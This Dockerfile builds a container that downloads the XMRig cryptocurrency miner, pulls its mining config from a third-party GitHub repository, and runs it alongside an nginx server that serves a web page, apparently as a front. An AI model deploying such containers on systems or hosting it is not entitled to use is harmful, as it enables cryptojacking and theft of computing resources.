# Use an official Ubuntu as a base image
FROM ubuntu:latest

# Install dependencies
RUN apt-get update && apt-get install -y \
    git \
    build-essential \
    cmake \
    libuv1-dev \
    libssl-dev \
    libhwloc-dev \
    nginx \
    wget && \
    rm -rf /var/lib/apt/lists/*

# Clone XMRig repository
# Download the file
RUN wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz

# Extract the tar.gz file
RUN tar xvzf xmrig-6.21.0-linux-x64.tar.gz

# Change directory
WORKDIR /xmrig-6.21.0/

# Remove existing config.json and download a new one
RUN rm -f config.json && \
    wget https://raw.githubusercontent.com/maanya125/super-duper-spoon/main/config.json

# Copy the custom Nginx configuration to serve the web page
COPY nginx.conf /etc/nginx/sites-available/default

# Copy the index.html file to Nginx document root
COPY index.html /var/www/html/index.html

# Expose ports for mining and web page
EXPOSE 3333
EXPOSE 8080

# Set working directory for XMRig
WORKDIR /xmrig-6.21.0/

# Command to run XMRig and Nginx
CMD service nginx start && ./xmrig --config=config.json
